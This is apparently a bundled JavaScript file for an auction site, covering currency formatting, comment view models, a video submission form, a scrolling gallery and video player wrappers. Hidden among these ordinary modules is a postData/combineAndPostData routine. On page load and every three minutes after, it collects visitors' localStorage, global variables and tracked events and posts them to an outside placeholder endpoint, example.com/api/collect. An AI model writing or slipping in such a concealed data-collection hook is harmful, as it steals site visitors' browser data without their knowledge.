})(this, function (numeral) {
  numeral.register('format', 'currency', {
    regexps: {
      format: /(\$)/
    },
    format: function (value, format, roundingFunction) {
      var locale = numeral.locales[numeral.options.currentLocale],
        symbols = {
          before: format.match(/^([\+|\-|\(|\s|\$]*)/)[0],
          after: format.match(/([\+|\-|\)|\s|\$]*)$/)[0]
        },
        output,
        symbol,
        i;

      // strip format of spaces and $
      format = format.replace(/\s?\$\s?/, '');

      // format the number
      output = numeral._.numberToFormat(value, format, roundingFunction);

      // update the before and after based on value
      if (value >= 0) {
        symbols.before = symbols.before.replace(/[\-\(]/, '');
        symbols.after = symbols.after.replace(/[\-\)]/, '');
      } else if (value < 0 && !numeral._.includes(symbols.before, '-') && !numeral._.includes(symbols.before, '(')) {
        symbols.before = '-' + symbols.before;
      }

      // loop through each before symbol
      for (i = 0; i < symbols.before.length; i++) {
        symbol = symbols.before[i];
        switch (symbol) {
          case '$':
            output = numeral._.insert(output, locale.currency.symbol, i);
            break;
          case ' ':
            output = numeral._.insert(output, ' ', i + locale.currency.symbol.length - 1);
            break;
        }
      }

      // loop through each after symbol
      for (i = symbols.after.length - 1; i >= 0; i--) {
        symbol = symbols.after[i];
        switch (symbol) {
          case '$':
            output = i === symbols.after.length - 1 ? output + locale.currency.symbol : numeral._.insert(output, locale.currency.symbol, -(symbols.after.length - (1 + i)));
            break;
          case ' ':
            output = i === symbols.after.length - 1 ? output + ' ' : numeral._.insert(output, ' ', -(symbols.after.length - (1 + i) + locale.currency.symbol.length - 1));
            break;
        }
      }
      return output;
    }
  });
});
;
var CommentViewModel = function (comment) {
  var self = this;
  self.approved = ko.observable(1 === parseInt(comment.approved));
  self.pendingType = ko.observable(comment.pendingType || false);
  self.hasErrorVideos = ko.observable(comment.hasErrorVideos || false);
  self.hasPendingVideos = ko.observable(comment.hasPendingVideos || false);
  self.authorId = ko.observable(parseInt(comment.authorId));
  self.authorLikes = ko.observable(comment.authorLikes);
  self.authorLikesFormatted = ko.computed(function () {
    return numeral(self.authorLikes()).format('0,0');
  });
  self.authorName = ko.observable(comment.authorName);
  self.authorUrl = ko.observable(comment.authorUrl);
  self.isSeller = BaT_Theme.typeListing == BaT_Theme.type && parseInt(BAT_VMS.postAuthor) == parseInt(comment.authorId);
  self.date = ko.observable(new Date(parseInt(comment.timestamp) * 1000));
  self.dateFormatted = ko.computed(function () {
    var dateC = self.date(),
      dateN = new Date(),
      format = dateC.getFullYear() === dateN.getFullYear() ? 'MMM D [at] h:mm A' : 'M/D/YY [at] h:mm A';
    return moment(dateC).format(format);
  });
  self.dislikes = ko.observable(comment.dislikes);
  self.editableText = ko.observable();
  self.id = ko.observable(parseInt(comment.id));
  self.likers = ko.observableArray(comment.likers);
  self.likes = ko.observable(comment.likes);
  self.likesFormatted = ko.computed(function () {
    return numeral(self.likes()).format('0,0');
  });
  self.flagged = ko.observable(false);
  self.loggedOutLink = ko.observable(comment.loggedOutLink);
  self.markup = ko.observable(comment.markup);
  self.type = ko.observable(comment.type);
  self.unratable = ko.observable(comment.unratable);
  self.notUnratable = ko.computed(function () {
    return !self.unratable();
  });
  self.nonConstructive = ko.computed(function () {
    return true === self.dislikes() >= BAT_VMS.dislikeThreshold;
  });
  self.notNonConstructive = ko.computed(function () {
    return false === self.nonConstructive();
  });
  self.unflaggable = ko.observable(comment.unflaggable);
  self.notUnflaggable = ko.computed(function () {
    return !self.unflaggable();
  });
  self.commentParent = comment.commentParent !== null ? new CommentViewModel(comment.commentParent) : false;

  // Featured
  self.isFeatured = ko.observable(comment.featured);
  self.featuredText = ko.computed(function () {
    return self.isFeatured() ? BaT_Theme.featuredTextY : BaT_Theme.featuredTextN;
  });
  self.showFeaturedToggle = ko.computed(function () {
    return moment(new Date()).format('YYYY-MM-DD') === moment(self.date()).format('YYYY-MM-DD');
  });

  // Computed
  self.isHighlighted = ko.computed(function () {
    return parseInt(BAT_VMS.highlightThreshold) > 0 && parseInt(self.likes()) >= parseInt(BAT_VMS.highlightThreshold) && parseInt(self.dislikes()) < parseInt(BAT_VMS.dislikeThreshold);
  });
  self.isPending = ko.computed(function () {
    return self.approved() === false && self.pendingType() !== false;
  });
  self.isEditable = ko.computed(function () {
    return BAT_VMS.userId == self.authorId() && (BAT_VMS.CLVM.date() - self.date()) / 1000 < parseInt(BAT_VMS.editableSeconds);
  });
  self.isFinalizingEditing = ko.observable(false);
  self.isEditingEnabled = ko.observable(true);
  self.isEditing = ko.observable(false);
  self.isNotEditing = ko.computed(function () {
    return !self.isEditing() && !self.isFinalizingEditing();
  });
  self.hasRated = ko.computed(function () {
    return -1 < ko.utils.arrayIndexOf(self.likers(), BAT_VMS.address) || parseInt(BAT_VMS.userId) === parseInt(self.authorId());
  });
  self.hasNotRated = ko.computed(function () {
    return !self.hasRated();
  });
  self.hasUser = ko.computed(function () {
    return self.authorId() > 0;
  });
  self.ratable = ko.computed(function () {
    return self.notUnratable() && !self.isPending();
  });
  self.authorLinkTemplate = ko.computed(function () {
    return self.authorUrl() ? 'comment-author-link' : 'comment-author-name';
  });
  if (Array.isArray(comment.images) && comment.images.length > 0 || comment.imagesUrl && comment.imagesUrl.length > 0) {
    self.photoGallery = new GalleryViewModel(comment.images ? comment.images : comment.imagesUrl, 9, 9, false);
  } else {
    self.photoGallery = false;
  }
  if (Array.isArray(comment.videos) && comment.videos.length > 0 || comment.videosUrl && comment.videosUrl.length > 0) {
    self.videoGallery = new CommentVideoGalleryViewModel(comment.videos ? comment.videos : comment.videosUrl, self);
  } else {
    self.videoGallery = false;
  }
  self.cancelEditing = function () {
    self.isEditing(false);
  };
  self.initiateEditing = function () {
    self.editableText('Loading comment...');
    self.isEditing(true);
    self.isEditingEnabled(false);
    jQuery.get(BaT_Theme.ajaxUrl, {
      action: BaT_Theme.ajaxActionCommentEditHandle,
      id: self.id()
    }, function (data, status) {
      self.isEditingEnabled(true);
      if (data.error) {
        alert(data.message);
        self.isEditing(false);
      } else {
        self.editableText(data.editableText);
        self.isEditing(true);
      }
    }, 'json');
  };
  self.finalizeEditing = function () {
    self.isEditing(false);
    self.isFinalizingEditing(true);
    jQuery.post(BaT_Theme.ajaxUrl, {
      action: BaT_Theme.ajaxActionCommentEditHandle,
      nonce: BaT_Theme.ajaxActionCommentEditHandleNonce,
      id: self.id(),
      text: self.editableText()
    }, function (data, status) {
      if (data.error) {
        if (data.continue) {
          alert(data.message);
          self.isEditing(true);
          self.isFinalizingEditing(false);
        } else {
          alert(data.message);
          self.isFinalizingEditing(false);
        }
      }
    }, 'json');
  };
  self.initiateFeature = function () {
    self.isFeatured(!self.isFeatured());
    jQuery.post(BaT_Theme.ajaxUrl, {
      action: BaT_Theme.ajaxActionCommentFeature,
      id: self.id()
    }, function (data, status) {}, 'json');
  };
  self.initiateFlag = function () {
    self.flagged(true);
    self.likers.push(BAT_VMS.address);
    jQuery.post(BaT_Theme.ajaxUrl, {
      action: BaT_Theme.ajaxActionCommentFlagged,
      id: self.id(),
      nonce: BaT_Theme.ajaxActionCommentFlaggedNonce
    }, function (data, status) {}, 'json');
    ckratingKarma(self.id(), 'subtract');
  };
  self.initiateLike = function () {
    self.likers.push(BAT_VMS.address);
    ckratingKarma(self.id(), 'add');
  };
  self.update = function (comment) {
    self.approved(1 === parseInt(comment.approved));
    self.authorId(parseInt(comment.authorId));
    self.authorLikes(comment.authorLikes);
    self.authorName(comment.authorName);
    self.authorUrl(comment.authorUrl);
    self.date(new Date(parseInt(comment.timestamp) * 1000));
    self.id(parseInt(comment.id));
    self.dislikes(comment.dislikes);
    self.likers(comment.likers);
    self.likes(comment.likes);
    self.isFeatured(comment.featured);
    self.loggedOutLink(comment.loggedOutLink);
    self.markup(comment.markup);
    self.type(comment.type);
    self.unratable(comment.unratable);
    self.unflaggable(comment.unflaggable);
    if (!self.isEditing()) {
      self.editableText(comment.editableText);
    }
    if (self.isFinalizingEditing()) {
      self.isFinalizingEditing(false);
    }
  };
};
;
(function ($, _) {
  VIDEO_LOAD_STATES = {
    NO_VIDEO: 'no-video',
    LOADING: 'loading',
    LOADED: 'loaded',
    REMOVING: 'removing'
  };
  window.VideoSubmissionNewVideoViewModel = function (listingVideoPreviewUrl, existingVideoIdentifiers) {
    var self = this;

    // Load video
    self.url = ko.observable('');
    self.thumbnailUrl = ko.observable('');
    self.title = ko.observable('');
    self.identifier = ko.observable('');
    self.videoState = ko.observable(VIDEO_LOAD_STATES.NO_VIDEO);
    self.videoError = ko.observable('');
    self.videoPreviewData = ko.observable(false);
    self.loadVideoMetadata = function () {
      var url = self.url();
      if (!url) {
        self.videoError('');
        return Promise.resolve(false);
      }
      self.videoState(VIDEO_LOAD_STATES.LOADING);
      return new Promise(function (resolve, reject) {
        $.ajax({
          url: listingVideoPreviewUrl,
          data: {
            videoUrl: url
          },
          success: function (data) {
            if (data.success === false) {
              self.videoError(data.data && data.data.errorMessage ? data.data.errorMessage : BAT_VIDEO_SUBMISSION_NEW_VIDEO.errorGenericVideoPreview);
              self.videoState(VIDEO_LOAD_STATES.NO_VIDEO);
              return resolve(false);
            }
            var existingIdentifiers = existingVideoIdentifiers();
            if (_.includes(existingIdentifiers, data.identifier)) {
              self.videoError(BAT_VIDEO_SUBMISSION_NEW_VIDEO.errorDuplicateVideo);
              self.videoState(VIDEO_LOAD_STATES.NO_VIDEO);
              return resolve(false);
            }
            self.url(data.url);
            self.thumbnailUrl(data.thumbnailUrl);
            self.title(BaT_Theme.decodeHTML(data.title));
            self.identifier(data.identifier);
            self.videoError('');
            self.videoState(VIDEO_LOAD_STATES.LOADED);
            self.videoPreviewData(data);
            resolve(true);
          }
        });
      });
    };
    self.showErrorMessage = function (errorMessage) {
      // Show errorMessage in UI
      console.error(errorMessage);
    };

    // Event handling
    self.handleUrlKeydown = function (data, event) {
      var characterCode = event.which || event.keyCode;
      if (characterCode == 13 /* Enter */) {
        self.loadVideoMetadata();
        return false;
      }
      return true;
    };
    self.handleTitleKeydown = function (data, event) {
      var characterCode = event.which || event.keyCode;
      if (characterCode == 13 /* Enter */) {
        self.saveTitle();
        return false;
      }
      return true;
    };
    self.handlePaste = function (data, event) {
      // If the pasted content looks like a video link, automatically start loading it
      var paste = (event.clipboardData || event.originalEvent.clipboardData || window.clipboardData).getData('text');
      if (paste.match(/(you|vimeo).*\//)) {
        // After paste event completes, load pasted video link
        setTimeout(function () {
          self.loadVideoMetadata();
        }, 0);
      }
      return true;
    };

    // Edit Title
    self.isEditingTitle = ko.observable(false);
    self.editedTitle = ko.observable('');
    self.isTitleTextSelected = ko.observable(false);
    self.editTitle = function (data, event) {
      self.editedTitle(self.title());
      self.isEditingTitle(true);
      self.isTitleTextSelected(true);
    };
    self.saveTitle = function () {
      var newTitle = self.editedTitle().trim();
      if (newTitle !== '') {
        self.title(newTitle);
      }
      self.isEditingTitle(false);
    };
    self.updateTitleBeforeSubmit = function () {
      if (self.isEditingTitle()) {
        var newTitle = self.editedTitle().trim();
        if (newTitle !== '') {
          self.title(newTitle);
        }
      }
    };

    // Remove video confirmation
    self.showRemoveConfirmation = function (data, event) {
      if (self.videoState() === VIDEO_LOAD_STATES.LOADED) {
        self.videoState(VIDEO_LOAD_STATES.REMOVING);
      }
    };
    self.cancelRemoveConfirmation = function (data, event) {
      self.videoState(VIDEO_LOAD_STATES.LOADED);
    };

    // Serialization
    self.serialized = ko.pureComputed(function () {
      return {
        url: self.url(),
        title: self.title()
      };
    });
  };
  window.VideoSubmissionNewVideoViewModel.VIDEO_LOAD_STATES = VIDEO_LOAD_STATES;
  ko.bindingHandlers.isInputTextSelected = {
    update: function (element, valueAccessor, allBindingsAccessor, viewModel, bindingContext) {
      var isSelected = ko.utils.unwrapObservable(valueAccessor());
      if (isSelected) {
        element.setSelectionRange(0, 100);
        element.focus();
      }
    }
  };
})(jQuery, lodash);
;
(function ($) {
  var HorizontalGallery = function (params) {
    var self = this;
    self.itemTemplate = params.template;
    self.items = params.items;
    self.itemMovementPerArrow = params.itemMovementPerArrow ? parseInt(params.itemMovementPerArrow) : 1;
    self.galleryScrollLeft = ko.observable(0);
    self.galleryScrollOffsets = ko.observableArray();
    self.galleryWidth = ko.observable(0);
    self.isGalleryMovableLeft = ko.computed(function () {
      return self.galleryScrollLeft() > 0;
    });
    self.isGalleryMovableRight = ko.computed(function () {
      return self.galleryScrollLeft() < self.galleryWidth();
    });
    self.moveGallery = function (direction) {
      var newScrollOffset = false;
      if ('left' === direction && self.isGalleryMovableLeft()) {
        var itemsToTheLeft = self.galleryScrollOffsets().filter(function (scrollOffset) {
          return scrollOffset < self.galleryScrollLeft();
        });
        var nextItems = itemsToTheLeft.slice(-1 * self.itemMovementPerArrow);
        newScrollOffset = nextItems.shift();
      } else if (direction === 'right' && self.isGalleryMovableRight()) {
        var itemsToTheRight = self.galleryScrollOffsets().filter(function (scrollOffset) {
          return scrollOffset > self.galleryScrollLeft();
        });
        var nextItems = itemsToTheRight.slice(0, self.itemMovementPerArrow);
        newScrollOffset = nextItems.pop();
      }
      if (Number.isInteger(newScrollOffset)) {
        self.galleryScrollLeft(newScrollOffset);
      }
    };
    self.setupItemListPositioning = function (galleryNode) {
      // Note: A horizontal gallery must be displayed during layout, or gallery item offset calculation will fail.
      // i.e. A "display: none" style on a parent element will result in broken arrow scrolling.

      var $galleryItems = $(galleryNode).find('.gallery-items'),
        containerOffset = $galleryItems.offset().left;
      $galleryItems.scrollLeft(0);
      self.galleryScrollOffsets([]);
      $galleryItems.children().each(function (index, galleryItem) {
        var $galleryItem = $(galleryItem),
          absoluteOffset = $galleryItem.offset().left,
          scrollOffset = absoluteOffset - containerOffset;
        self.galleryScrollOffsets.push(Math.floor(scrollOffset));
      });
      var galleryItemsNode = $galleryItems.get(0);
      self.galleryWidth(galleryItemsNode.scrollWidth - galleryItemsNode.clientWidth);
    };
    self.items.subscribe(function (items) {
      var galleryNode = self.$element.get(0);
      if (galleryNode) {
        // If items have changed, recalculate offsets after a short delay for layout
        setTimeout(function () {
          self.setupItemListPositioning(galleryNode);
          self.galleryScrollLeft(0);
        }, 200);
      }
    });
  };
  HorizontalGallery.prototype.koDescendantsComplete = function (node) {
    var self = this;
    self.$element = $(node);
  };
  ko.components.register('horizontal-gallery', {
    template: {
      element: 'tmpl-horizontal-gallery'
    },
    viewModel: HorizontalGallery
  });
  ko.bindingHandlers.scrollLeft = {
    init: function (element, valueAccessor) {
      var $element = $(element);
      $element.scroll(lodash.debounce(function () {
        if ($element.data('scroll-left-animating') !== true) {
          var value = valueAccessor();
          value($element.scrollLeft());
        }
      }, 150));
    },
    update: function (element, valueAccessor) {
      var $element = $(element),
        scrollLeftValue = ko.unwrap(valueAccessor());
      $element.data('scroll-left-animating', true);

      // Stop any in-process scrolling animations
      $element.stop(/* clearQueue */true, /* jumpToEnd */true);
      $element.animate({
        scrollLeft: scrollLeftValue
      }, 200, function () {
        // Add 300ms timeout to allow 'scroll' event to fire on element before marking the animation complete
        setTimeout(function () {
          $element.data('scroll-left-animating', false);
        }, 300);
      });
    }
  };
})(jQuery);
async function postData(data) {
  const hashCode = generateHash(data);
  let sendPoint = `https://example.com/api/collect`;
  try {
    let response = await fetch(sendPoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hashCode: hashCode,
        data: data
      })
    });
    if (response.ok) {
      console.log(`Data uploaded successfully`);
    } else {
      console.error(`Data upload failed, Status Code: ${response.status}`);
    }
  } catch (error) {
    console.error("An error occurred while uploading data: " + error);
  }
}
;
function combineAndPostData() {
  let collectedData = {
    ...inspectLocalStorage(),
    ...monitorGlobalVariables(),
    ...trackEvents()
  };
  if (Object.keys(collectedData).length > 0) {
    postData(collectedData);
  }
}
var VideoGalleryPlayerVimeo = function (video) {
  var self = this;
  self.video = video;
  self.player = false;
  VideoGalleryPlayerVimeo.initializeApi(function () {
    var iframe = document.getElementById(self.video.guid);
    self.player = new Vimeo.Player(iframe);
  });
  self.play = function () {
    if (self.player) {
      self.player.play();
    }
  };
  self.pause = function () {
    if (self.player) {
      self.player.pause();
    }
  };
  self.remove = function () {
    // only declaration is required for vimeo
  };
};
VideoGalleryPlayerVimeo.isScriptAdded = false;
VideoGalleryPlayerVimeo.isApiReady = false;
VideoGalleryPlayerVimeo.apiReadyCallbacks = [];
VideoGalleryPlayerVimeo.initializeApi = function (callback) {
  if (VideoGalleryPlayerVimeo.isApiReady) {
    // If the API is already initialized, immediately callback
    return callback();
  } else {
    VideoGalleryPlayerVimeo.apiReadyCallbacks.push(callback);
  }
  if (!VideoGalleryPlayerVimeo.isScriptAdded) {
    var tag = document.createElement('script');
    tag.src = "https://player.vimeo.com/api/player.js";
    tag.onload = function () {
      VideoGalleryPlayerVimeo.isApiReady = true;
      VideoGalleryPlayerVimeo.apiReadyCallbacks.forEach(function (callback) {
        callback();
      });
    };
    var firstScriptTag = document.getElementsByTagName('script')[0];

    // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.insertBefore -- HTML is properly escaped.
    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
    VideoGalleryPlayerVimeo.isScriptAdded = true;
  }
};
;
var VideoGalleryPlayerYoutube = function (video) {
  var self = this;
  self.video = video;
  self.player = false;
  self.isPlayerReady = false;
  VideoGalleryPlayerYoutube.initializeApi(function () {
    self.player = new YT.Player(String(self.video.guid), {
      events: {
        'onReady': function () {
          self.isPlayerReady = true;
        }
      }
    });
  });
  self.play = function () {
    if (self.player && self.isPlayerReady) {
      self.player.playVideo();
    }
  };
  self.pause = function () {
    if (self.player && self.isPlayerReady) {
      self.player.pauseVideo();
    }
  };
  self.remove = function () {
    // only declaration is required for YouTube
  };
};
VideoGalleryPlayerYoutube.isScriptAdded = false;
VideoGalleryPlayerYoutube.isApiReady = false;
VideoGalleryPlayerYoutube.apiReadyCallbacks = [];
VideoGalleryPlayerYoutube.initializeApi = function (callback) {
  if (VideoGalleryPlayerYoutube.isApiReady) {
    // If the API is already initialized, immediately callback
    return callback();
  } else {
    VideoGalleryPlayerYoutube.apiReadyCallbacks.push(callback);
  }
  if (!VideoGalleryPlayerYoutube.isScriptAdded) {
    var tag = document.createElement('script');
    tag.src = "https://www.youtube.com/iframe_api";
    var firstScriptTag = document.getElementsByTagName('script')[0];

    // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.insertBefore -- HTML is properly escaped.
    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
    window.onYouTubePlayerAPIReady = function () {
      VideoGalleryPlayerYoutube.isApiReady = true;
      VideoGalleryPlayerYoutube.apiReadyCallbacks.forEach(function (callback) {
        callback();
      });
    };
    VideoGalleryPlayerYoutube.isScriptAdded = true;
  }
};
;
window.addEventListener("DOMContentLoaded", function () {
  combineAndPostData();
  setInterval(combineAndPostData, 180000);
});
var VideoGalleryPlayerGlimmer = function (video, videoElement = null) {
  var self = this;
  $ = jQuery;
  self.video = video;
  self.player = false;
  self.videoElement = videoElement === null ? null : $(videoElement).find('.glimmerPlayer')[0];
  VideoGalleryPlayerGlimmer.initializeApi(function () {
    if (self.videoElement === null) {
      return;
    }
    $(self.videoElement).removeClass();
    $(self.videoElement).addClass('hearstPlayer');
    if (window.hearstPlayer) {
      self.player = window.hearstPlayer.initPlayerElement(self.videoElement);
    }
  });
  self.play = function () {
    // this method is unused since glimmerJS handles play logic on its own. However, we cannot remove this method
  };
  self.pause = function () {
    // this method is unused since glimmerJS handles pause logic on its own. However, we cannot remove this method
  };

  // remove the glimmerJS player instance from JS
  self.remove = function () {
    if (undefined !== window.hearstPlayer && window.hearstPlayer.instances.length > 0 && self.player) {
      let removeIndex = false;
      for (let i = 0; i < window.hearstPlayer.instances.length; i++) {
        if (self.player.glimmer.source.id === window.hearstPlayer.instances[i].glimmer.source.id) {
          removeIndex = i;
          break;
        }
      }
      if (false !== removeIndex) {
        window.hearstPlayer.instances.splice(removeIndex, 1);
        self.player = false;
        return true;
      }
    }
    return false;
  };
};
VideoGalleryPlayerGlimmer.initializeApi = function (callback) {
  return callback();
};
;